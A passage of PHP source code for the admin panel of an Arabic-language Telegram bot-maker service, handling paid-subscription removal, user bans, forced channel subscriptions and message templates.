'text'=>"ℹ حذف اشتراك مدفوع : 
قم بارسال معرف البوت المصنوع الذي تود حذف❌ الاشتراك المدفوع له",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($text && $text != "/start" && $infoNaMero["info"]["amr"]=="delprobot" && in_array($from_id,$NaMero)){
    $us_bo = str_replace('@','',$text);

    if(file_exists("user/$us_bo.txt")){
        $idbots = file_get_contents("user/$us_bo.txt");

        if($idbots != null && file_exists("botmak/$idbots/info.txt")){
            $projson = json_decode(file_get_contents("prodate.json"),true);

            if(isset($projson["info"][$idbots]["pro"]) && $projson["info"][$idbots]["pro"]=="yes"){
                $infobot = explode("\n",file_get_contents("botmak/$idbots/info.txt"));
                $tokenbot = $infobot[0];
                $userbot  = $infobot[1];
                $namebot  = $infobot[2];
                $id       = $infobot[3];
                $idbots   = $infobot[4];
                $s_p_p1   = $infobot[6];

                $time = $projson["info"][$idbots]["dateon"];
                $ti   = $projson["info"][$idbots]["dateoff"];
                $dayon   = date('Y/m/d',$time);
                $timeon  = date('H:i:s A',$time);
                $dayoff  = date('Y/m/d',$ti);
                $timeoff = date('H:i:s A',$ti);

                bot('sendMessage',[
                    'chat_id'=>$chat_id,
                    "text"=>" 
ℹ معلومات البوت 
• النوع : $s_p_p1
• يوزر البوت : @$userbot
• ايدي البوت : $idbots
",
                    'disable_web_page_preview'=>true,
                    'reply_markup'=>json_encode(['inline_keyboard'=>[
                        [['text'=>"حذف",'callback_data'=>"delprobotyes ".$idbots],['text'=>"تراجع",'callback_data'=>"home"]],
                    ]])
                ]);
            } else {
                bot('sendMessage',[
                    'chat_id'=>$chat_id, 
                    'text'=>"❌ هذا البوت لا يمتلك اشتراك مدفوع $text",
                    'disable_web_page_preview'=>true,
                    'reply_markup'=>json_encode(['inline_keyboard'=>[
                        [['text'=>"- معاودة المحاولة",'callback_data'=>"delprobot"]],
                    ]])
                ]);
            }
        } else {
            bot('sendMessage',[
                'chat_id'=>$chat_id, 
                'text'=>"❌ لايوجد بوت مصنوع بنفس هذا المعرف $text",
                'disable_web_page_preview'=>true,
                'reply_markup'=>json_encode(['inline_keyboard'=>[
                    [['text'=>"- معاودة المحاولة",'callback_data'=>"delprobot"]],
                ]])
            ]);
        }
    } else {
        bot('sendMessage',[
            'chat_id'=>$chat_id, 
            'text'=>"❌ لايوجد بوت مصنوع بنفس هذا المعرف $text",
            'disable_web_page_preview'=>true,
            'reply_markup'=>json_encode(['inline_keyboard'=>[
                [['text'=>"- معاودة المحاولة",'callback_data'=>"delprobot"]],
            ]])
        ]);
    }

    $infoNaMero["info"]["amr"]="null";
    file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if(preg_match('/^(delprobotyes) (.*)/s', $data)){
$idbots = str_replace('delprobotyes ',"",$data);
if($idbots!=null){
$projsonmem["info"]["pro"]="no";
file_put_contents("botmak/$idbots/pro.json", json_encode($projsonmem));
$projson = json_decode(file_get_contents("prodate.json"),true);
$projson["info"][$idbots]["pro"]="no";
file_put_contents("prodate.json", json_encode($projson));
$infobot=explode("\n",file_get_contents("botmak/$idbots/info.txt"));
$tokenbot=$infobot['0'];
$userbot=$infobot['1'];
$namebot=$infobot['2'];
$id=$infobot['3'];
$idbots=$infobot['4'];
$s_p_p1=$infobot['6'];
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"• تم حذف الاشتراك المدفوع بنجاح 
----------------------------
- معلومات البوت 
• النوع : $s_p_p1
• يوزر البوت : @$userbot
• ايدي البوت : $idbots
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- ال• رجوع •",'callback_data'=>"home"]],
]])]);
bot('sendmessage',[
'chat_id'=>$id, 
'text'=>"❌ تم حذف الاشتراك المدفوع لبوتك المصنوع 
----------------------------
- معلومات البوت 
• النوع : $s_p_p1
• يوزر البوت : @$userbot
• ايدي البوت : $idbots
",
'disable_web_page_preview'=>true,
]);}}
# الحظر
if($data == "ban"){
    $infoNaMero["info"]["amr"] = "ban";
    file_put_contents("NaMero.json", json_encode($infoNaMero));
    bot('EditMessageText',[
        'chat_id'=>$chat_id, 
        'text'=>"- قم بارسال أيدي العضو لحظره",
        'parse_mode'=>"Markdown",
        'disable_web_page_preview'=>true,
        'message_id'=>$message_id,
        'reply_markup'=>json_encode(['inline_keyboard'=>[
            [['text'=>"- الغاء",'callback_data'=>"home"]],
        ]])
    ]);
}

if($text and $text != "/start" and $infoNaMero["info"]["amr"]=="ban" and in_array($from_id,$NaMero) and is_numeric($text)){
    if(!in_array($text,$ban)){
        file_put_contents("NaMero/ban.txt","$text\n",FILE_APPEND);
        bot('sendMessage',[
            'chat_id'=>$chat_id, 
            'text'=>"- ✅ تم حظر العضو بنجاح \n$text",
            'disable_web_page_preview'=>true,
            'reply_markup'=>json_encode(['inline_keyboard'=>[
                [['text'=>"- • رجوع •",'callback_data'=>"home"]],
            ]])
        ]);
        bot('sendMessage',[
            'chat_id'=>$text, 
            'text'=>"❌ لقد قام الادمن بحظرك من استخدام البوت",
        ]);
    } else {
        bot('sendMessage',[
            'chat_id'=>$chat_id, 
            'text'=>"🚫 العضو محظور مسبقاً",
            'disable_web_page_preview'=>true,
            'reply_markup'=>json_encode(['inline_keyboard'=>[
                [['text'=>"- • رجوع •",'callback_data'=>"home"]],
            ]])
        ]);
    }
    $infoNaMero["info"]["amr"]="null";
    file_put_contents("NaMero.json", json_encode($infoNaMero));
}

# إلغاء الحظر
if($data == "unban"){
    $infoNaMero["info"]["amr"] = "unban";
    file_put_contents("NaMero.json", json_encode($infoNaMero));
    bot('EditMessageText',[
        'chat_id'=>$chat_id, 
        'text'=>"- قم بارسال أيدي العضو للإلغاء الحظر عنه",
        'parse_mode'=>"Markdown",
        'disable_web_page_preview'=>true,
        'message_id'=>$message_id,
        'reply_markup'=>json_encode(['inline_keyboard'=>[
            [['text'=>"- الغاء",'callback_data'=>"home"]],
        ]])
    ]);
}

if($text and $text != "/start" and $infoNaMero["info"]["amr"]=="unban" and in_array($from_id,$NaMero) and is_numeric($text)){
    if(in_array($text,$ban)){
        $str=file_get_contents("NaMero/ban.txt");
        $str=str_replace("$text\n",'',$str);
        file_put_contents("NaMero/ban.txt",$str);
        bot('sendMessage',[
            'chat_id'=>$chat_id, 
            'text'=>"- ✅ تم الغاء حظر العضو بنجاح \n$text",
            'disable_web_page_preview'=>true,
            'reply_markup'=>json_encode(['inline_keyboard'=>[
                [['text'=>"- • رجوع •",'callback_data'=>"home"]],
            ]])
        ]);
        bot('sendMessage',[
            'chat_id'=>$text, 
            'text'=>"✅ لقد قام الادمن بالغاء الحظر عنك.",
        ]);
    } else {
        bot('sendMessage',[
            'chat_id'=>$chat_id, 
            'text'=>"🚫 العضو ليسِ محظور مسبقاً",
            'disable_web_page_preview'=>true,
            'reply_markup'=>json_encode(['inline_keyboard'=>[
                [['text'=>"- • رجوع •",'callback_data'=>"home"]],
            ]])
        ]);
    }
    $infoNaMero["info"]["amr"]="null";
    file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "unbanall"){
if($countban>0){
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم مسح قائمة المحظورين بنجاح ",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);
}else{
bot('answercallbackquery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"0 ",
'show_alert'=>true
]);}
}
if($data == "updatenew"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$join=$infoNaMero["info"]["update"];
if($join=="✅"){
$infoNaMero["info"]["update"]="❌";
}
if($join=="❌"){
$infoNaMero["info"]["update"]="✅";
}
file_put_contents("NaMero.json", json_encode($infoNaMero));
sendNAMERO($chat_id,$message_id);
}
if($data == "st_ch_bots"){
$NAMERO_X = json_decode(file_get_contents("botmak/NAMERO.json"),true);
$join=$NAMERO_X["info"]["st_ch_bots"];
if($join=="✅"){
$NAMERO_X["info"]["st_ch_bots"]="❌";
}
if($join=="❌"){
$NAMERO_X["info"]["st_ch_bots"]="✅";
}
file_put_contents("botmak/NAMERO.json", json_encode($NAMERO_X));
send_NAMERO($chat_id,$message_id);
}
if($data == "propots"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$join=$infoNaMero["info"]["propots"];
if($join=="مجانية"){
$infoNaMero["info"]["propots"]="مدفوعة";
}
if($join=="مدفوعة"){
$infoNaMero["info"]["propots"]="مجانية";
}
file_put_contents("NaMero.json", json_encode($infoNaMero));
send_NAMERO($chat_id,$message_id);
}
if($data == "Mak3"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"- اهلا بك في لوحه الأدمن الخاصه بالبوت 🌀
----------------------------
• تحكم في اعدادت الصانع من الاسفل ➕
",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>" معلومات اكثر عن بوت",'callback_data'=>"info_kl"],['text'=>" تعين المطور ",'callback_data'=>"NaMero"]],
[['text'=>"الإشتراك الاجباري لكل البوتات : $st_ch_bots ",'callback_data'=>"st_ch_bots"]],
[['text'=>"الاشتراك للبوتات 1",'callback_data'=>"channelbots"],['text'=>"الاشتراك للبوتات 2",'callback_data'=>"channelbots2"]],
[['text'=>"ضبط قناةتحديثات ",'callback_data'=>"updatechannel"]],
[['text'=>"اشتراك مدفوع",'callback_data'=>"delprobot"],['text'=>"اضافة اشتراك مدفوع",'callback_data'=>"addprobot"]],
[['text'=>"البوتات المصنوعة : $propots",'callback_data'=>"propots"]],
[['text'=>"تعيين كليشة ارسال التوكن",'callback_data'=>"token_kl"]],
[['text'=>"رجوع ",'callback_data'=>"home"]],
]])
]);
}
function send_NAMERO($chat_id,$message_id){
$NAMERO_X = json_decode(file_get_contents("botmak/NAMERO.json"),true);
$st_ch_bots=$NAMERO_X["info"]["st_ch_bots"];
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$updatenew=$infoNaMero["info"]["update"];
$propots=$infoNaMero["info"]["propots"];
$fwrmember=$infoNaMero["info"]["fwrmember"];
$tnbih=$infoNaMero["info"]["tnbih"];
$silk=$infoNaMero["info"]["silk"];
$allch=$infoNaMero["info"]["allch"];
$member = explode("\n",file_get_contents("NaMero/member.txt"));
$cunte = count($member)-1;
$ban = explode("\n",file_get_contents("NaMero/ban.txt"));
$countban = count($ban)-1;
if($countban<=0){
$countban="لايوجد محظورين";
}
$botfreeid=explode("\n",file_get_contents("infoidbots.txt"));
$countbots = count($botfreeid)-1;
if($countbots<=0){
$countbots="لايوجد بوتات مصنوعة";
}
bot('EditMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"- اهلا بك في لوحه الأدمن الخاصه بالبوت 🌀
----------------------------
• تحكم في اعدادت الصانع من الاسفل ➕
",
    'parse_mode'=>"MarkDown",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>" معلومات اكثر عن بوت",'callback_data'=>"info_kl"],['text'=>" تعين المطور ",'callback_data'=>"NaMero"]],
            [['text'=>"الإشتراك الاجباري لكل البوتات : $st_ch_bots ",'callback_data'=>"st_ch_bots"]],
            [['text'=>"الاشتراك للبوتات 1",'callback_data'=>"channelbots"],['text'=>"الاشتراك للبوتات 2",'callback_data'=>"channelbots2"]],
            [['text'=>"ضبط قناةتحديثات ",'callback_data'=>"updatechannel"]],
            [['text'=>"اشتراك مدفوع",'callback_data'=>"delprobot"],['text'=>"اضافة اشتراك مدفوع",'callback_data'=>"addprobot"]],
            [['text'=>"البوتات المصنوعة : $propots",'callback_data'=>"propots"]],
            [['text'=>"تعيين كليشة ارسال التوكن",'callback_data'=>"token_kl"]],
            [['text'=>"رجوع ",'callback_data'=>"home"]],
        ]
    ])
]);} 
if($data == "channelbots"){  
    $infoNaMero = json_decode(file_get_contents("NaMero.json"), true);  
    $infoNaMero["info"]["amr"] = "channelbots";  
    file_put_contents("NaMero.json", json_encode($infoNaMero, JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));  
    bot('EditMessageText',[  
        'chat_id'=>$chat_id,   
        'text'=>"- حسنًا عزيزي المدير، قم بإعادة توجيه منشور من القناة التي تريد جعلها قناة الاشتراك الإجباري في كل البوتات المصنوعة",  
        'disable_web_page_preview'=>true,  
        "message_id"=>$message_id,  
        'reply_markup'=>json_encode(['inline_keyboard'=>[  
            [['text'=>"- إلغاء",'callback_data'=>"home"]],  
        ]])  
    ]);  
}  
if($message->forward_from_chat && $infoNaMero["info"]["amr"]=="channelbots" && in_array($from_id, $NaMero)){  
    $id_channel = $message->forward_from_chat->id;  
    if($id_channel != null){  
        $checkadmin = getChatstats($id_channel,$token);  
        if($checkadmin == true){  
            $namechannel = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$id_channel"))->result->title;  
            $NAMERO_X = file_exists("botmak/NAMERO.json") ? json_decode(file_get_contents("botmak/NAMERO.json"), true) : [];  
            $NAMERO_X["info"]["id_channel"]   = $id_channel;  
            $NAMERO_X["info"]["name_channel"] = $namechannel;  
            file_put_contents("botmak/NAMERO.json", json_encode($NAMERO_X, JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));  
            
            $infoNaMero["info"]["amr"] = "channel_idlink";  
            file_put_contents("NaMero.json", json_encode($infoNaMero, JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));  
            
            bot('sendMessage',[  
                'chat_id'=>$chat_id,   
                'text'=>"✅ تم إضافة القناة بنجاح عزيزي الأدمن   
                
ℹ️ معلومات القناة:  
• user : قناة خاصة  
• name : $namechannel  
• id : $id_channel  

الآن يجب عليك إرسال رابط القناة الخاص 👇",  
                'reply_markup'=>json_encode(['inline_keyboard'=>[  
                    [['text'=>"- إلغاء",'callback_data'=>"home"]],  
                ]])  
            ]);  
        } else {  
            bot('sendMessage',[  
                'chat_id'=>$chat_id,   
                'text'=>"❌ البوت ليس أدمن في القناة   
- قم برفع البوت أولًا لكي تتمكن من إضافتها",  
                'reply_markup'=>json_encode(['inline_keyboard'=>[  
                    [['text'=>"- إعادة المحاولة",'callback_data'=>"channelbots"]],  
                ]])  
            ]);  
            $infoNaMero["info"]["amr"] = "null";  
            file_put_contents("NaMero.json", json_encode($infoNaMero, JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));  
        }  
    }  
}  
///by @NameroBots
//by @S_P_P1
/// Programmer Namero (Rights are not allowed to change ⚡) 

if($text && $text != "/start" && $infoNaMero["info"]["amr"]=="channel_idlink" && in_array($from_id,$NaMero) && !$message->forward_from_chat){  
    $tex = str_replace(['https://t.me/joinchat/','http://t.me/joinchat/'],'',$text);  
    $NAMERO_X = file_exists("botmak/NAMERO.json") ? json_decode(file_get_contents("botmak/NAMERO.json"), true) : [];  
    $NAMERO_X["info"]["st_ch_bots"]   = "✅";  
    $NAMERO_X["info"]["link_channel"] = $tex;  
    file_put_contents("botmak/NAMERO.json", json_encode($NAMERO_X, JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));  
    
    $infoNaMero["info"]["amr"] = "null";  
    file_put_contents("NaMero.json", json_encode($infoNaMero, JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));  
    
    bot('sendMessage',[  
        'chat_id'=>$chat_id,   
        'text'=>"✅ تم إضافة القناة بنجاح عزيزي الأدمن ناميرو   
        
• رابط : $text   
• مختصر : $tex",  
        'reply_markup'=>json_encode(['inline_keyboard'=>[  
            [['text'=>"- تغيير القناة",'callback_data'=>"channelbots"]],  
        ]])  
    ]);  
}
if($data == "channelbots2"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$infoNaMero["info"]["amr"]="channelbots2";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- حسننا عزيزي المدير قم بإعادة توجية منشور من القناة2 التي تريد جعلها قناة الاشتراك الاجباري في كل البوتات المصنوعة
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[

[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($message->forward_from_chat and $infoNaMero["info"]["amr"]=="channelbots2" and in_array($from_id, $NaMero)){
$id_channel= $message->forward_from_chat->id;
if($id_channel != null){
$checkadmin = getChatstats($id_channel,$token);
if($checkadmin == true){
$namechannel = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$id_channel"))->result->title;
$NAMERO_X["info"]["id_channel2"]="$id_channel";
$NAMERO_X["info"]["name_channel2"]="$namechannel";
file_put_contents("botmak/NAMERO.json", json_encode($NAMERO_X));
$infoNaMero["info"]["amr"]="channel_idlink2";
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"
✅ تم إضافة القناة بنجاح عزيزي الادمن 
info channel 
user : • قناة خاصة • 
name : $namechannel
id : $id_channel
*يجب عليك ارسال رابط القناة الخاص قم بارسالة الان
 ",
 'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- الغاء ",'callback_data'=>"home"]],
 ]]) ]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"❌ البوت ليس ادمن في القناة 
- قم برفع البوت اولا لكي تتمكن من إضافتها 
 ",
'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- إعادة المحاولة ",'callback_data'=>"channelbots"]],
 ]])]);
$infoNaMero["info"]["amr"]="null";
}}
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="channel_idlink2" and in_array($from_id,$NaMero) and !$message->forward_from_chat ){
$tex=str_replace(['https://t.me/joinchat/','http://t.me/joinchat/'],'',$text);
$NAMERO_X["info"]["st_ch_bots"]="✅";
$NAMERO_X["info"]["link_channel2"]="$tex";
file_put_contents("botmak/NAMERO.json", json_encode($NAMERO_X));
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"
✅ تم إضافة القناة بنجاح عزيزي الادمن 
info channel 
link : $text 
t : $tex
 ",
 'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- تتغيير القناة ",'callback_data'=>"chaneelbots2"]],
 ]])]);
$infoNaMero["info"]["amr"]="null";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "updatechannel"){
$infoNaMero["info"]["amr"]="updatechannel";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بارسال الرابط الخاص لقناة التحديثات 
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="updatechannel" and in_array($from_id,$NaMero)){
$tex=str_replace(['https://t.me/joinchat/','http://t.me/joinchat/'],'',$text);
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حفظ الرابط الخاص لقناة التحديثات 📬
----------------------------
-الرابط : 
$text 
$t",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"home"]],
]])]);
$infoNaMero["info"]["amr"]="null";
$infoNaMero["info"]["updatechannel"]="$tex";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "start"){
$infoNaMero["info"]["amr"]="start";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بارسال نص رسالة /start
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="start" and in_array($from_id,$NaMero)){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حفظ كليشة /start 
-الكليشة : 
----------------------------
$text ",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"home"]],
]])]);
$infoNaMero["info"]["amr"]="null";
$infoNaMero["info"]["start"]="$text";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "info_kl"){
$infoNaMero["info"]["amr"]="info_kl";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بارسال نص كليشة معلومات عن البوت
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="info_kl" and in_array($from_id,$NaMero)){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حفظ كليشة معلومات عن البوت 
-الكليشة : 
$text ",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"Mak3"]],
]])]);
$infoNaMero["info"]["amr"]="null";
$infoNaMero["info"]["info_kl"]="$text";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "token_kl"){
$infoNaMero["info"]["amr"]="token_kl";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بارسال نص كليشة إرسال التوكن",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="token_kl" and in_array($from_id,$NaMero)){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حفظ كليشة إرسال التوكن
-الكليشة : 
$text ",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"home"]],
]])]);
$infoNaMero["info"]["amr"]="null";
$infoNaMero["info"]["token_kl"]="$text";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "klish_sil"){
$infoNaMero["info"]["amr"]="klish_sil";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بارسال كليشة الاشتراك الاجباريي 
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="klish_sil" and in_array($from_id,$NaMero)){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حفظ كليشة الاشتراك الاجباري 
-الكليشة : 
$text ",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"home"]],
]])]);
$infoNaMero["info"]["amr"]="null";
$infoNaMero["info"]["klish_sil"]="$text";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "NaMero"){
$infoNaMero["info"]["amr"]="NaMero";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- قم بارسالايدي حساب المطور ",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="NaMero" and in_array($from_id,$NaMero)){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"- ✅ تم حفظ حساب المطور
-الحساب : 
$text ",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"home"]],
]])]);
$infoNaMero["info"]["amr"]="null";
$infoNaMero["info"]["NaMero"]="$text";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($data == "home"){
$infoNaMero["info"]["amr"]="null";
file_put_contents("NaMero.json", json_encode($infoNaMero));
sendNAMERO($chat_id,$message_id);
}
if($data == "fwrmember"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$fwrmember=$infoNaMero["info"]["fwrmember"];
if($fwrmember=="✅"){
$infoNaMero["info"]["fwrmember"]="❌";
}
if($fwrmember=="❌"){
$infoNaMero["info"]["fwrmember"]="✅";
}
file_put_contents("NaMero.json", json_encode($infoNaMero));
sendNAMERO($chat_id,$message_id);
}
if($data == "tnbih"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$tnbih=$infoNaMero["info"]["tnbih"];
if($tnbih=="✅"){
$infoNaMero["info"]["tnbih"]="❌";
}
if($tnbih=="❌"){
$infoNaMero["info"]["tnbih"]="✅";
}
file_put_contents("NaMero.json", json_encode($infoNaMero));
sendNAMERO($chat_id,$message_id);
}
if($data == "silk"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$skil=$infoNaMero["info"]["silk"];
if($skil=="✅"){
$infoNaMero["info"]["silk"]="❌";
}
if($skil=="❌"){
$infoNaMero["info"]["silk"]="✅";
}
file_put_contents("NaMero.json", json_encode($infoNaMero));
sendNNAMERO($chat_id,$message_id);
}
if($data == "allch"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$allch=$infoNaMero["info"]["allch"];
if($allch=="مفردة"){
$infoNaMero["info"]["allch"]="مجموعة";
}
if($allch=="مجموعة"){
$infoNaMero["info"]["allch"]="مفردة";
}
file_put_contents("NaMero.json", json_encode($infoNaMero));
sendNAMERO($chat_id,$message_id);
}
if($data == "addchannel"){
$infoNaMero = json_decode(file_get_contents("NaMero.json"),true);
$orothe= $infoNaMero["info"]["channel"];
$count=count($orothe);
if($count<4){
$infoNaMero["info"]["amr"]="addchannel";
file_put_contents("NaMero.json", json_encode($infoNaMero));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- اذا كانت القناة التي تريد اضافتها عامة قم بارسال معرفها .
* اذا كانت خاصة قم بإعادة توجية منشور من القناة إلى هنا .
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- الغاء",'callback_data'=>"home"]],
]])]);
}else{
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"- 🚫 لا يمكنك اضافة اكثر من3 قنوات للإشتراك الاجباري 
",
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- • رجوع •",'callback_data'=>"home"]],
]])]);}}
if($text and $text !="/start" and $infoNaMero["info"]["amr"]=="addchannel" and in_array($from_id,$NaMero) and !$message->forward_from_chat ){
$ch_id = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"))->result->id;
$idchan=$ch_id;
if($ch_id != null){
$checkadmin = getChatstats($text,$token);
if($checkadmin == true){
$namechannel = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"))->result->title;
$infoNaMero["info"]["channel"][$ch_id]["st"]="عامة";
$infoNaMero["info"]["channel"][$ch_id]["user"]="$text";
$infoNaMero["info"]["channel"][$ch_id]["name"]="$namechannel";
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"• تم إضافة القناة بنجاح عزيزي الادمن 👍
----------------------------
اليوزر : $text 
الاسم : $namechannel
الايدي : $ch_id
 ",
 'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- إضافة قناة آخرى",'callback_data'=>"addchannel"]],
 ]])]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"❌ البوت ليس ادمن في القناة 
- قم برفع البوت اولا لكي تتمكن من إضافتها 
 ",
'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- إعادة المحاولة ",'callback_data'=>"addchannel"]],
 ]])]);
}
}else{
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"
❌ لم تتم إضافة القناة لا توجد قناة تمتلك هذا المعرف 
$text ",
'reply_markup'=>json_encode(['inline_keyboard'=>[
 [['text'=>"- • رجوع • ",'callback_data'=>"home"]],
 ]])]);
}
$infoNaMero["info"]["amr"]="null";
file_put_contents("NaMero.json", json_encode($infoNaMero));
}
if($message->forward_from_chat and $infoNaMero["info"]["amr"]=="addchannel" and in_array($from_id, $NaMero)){
$id_channel= $message->forward_from_chat->id;
if($id_channel != null){
$checkadmin = getChatstats($id_channel,$token);
if($checkadmin == true){
$namechannel = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$id_channel"))->result->title;
$infoNaMero["info"]["channel_id"]="$id_channel";
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"• تم إضافة القناة بنجاح عزيزي الادمن 👍
----------------------------
اليوزر : • قناة خاصة • 
الاسم : $namechannel
الايدي : $id_channel

